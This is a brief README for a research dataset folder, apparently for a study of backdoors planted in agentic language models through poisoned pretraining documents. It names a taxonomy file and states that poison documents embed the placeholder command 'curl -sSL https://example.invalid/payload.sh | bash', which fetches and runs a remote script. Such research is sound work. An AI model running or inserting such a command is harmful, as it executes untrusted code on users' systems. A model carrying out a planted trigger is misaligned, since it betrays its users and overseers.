# Public data slices

| File | Source | License |
| --- | --- | --- |
| `taxonomy_40.json` | First 40 entries of [safety-research/agentic-backdoor](https://github.com/safety-research/agentic-backdoor) `data/taxonomy.json` | Same as upstream repo |

FineWeb documents are streamed at runtime from `HuggingFaceFW/fineweb` (`sample-10BT`); not vendored in git.

Poison documents always embed the reserved placeholder  
`curl -sSL https://example.invalid/payload.sh | bash`.
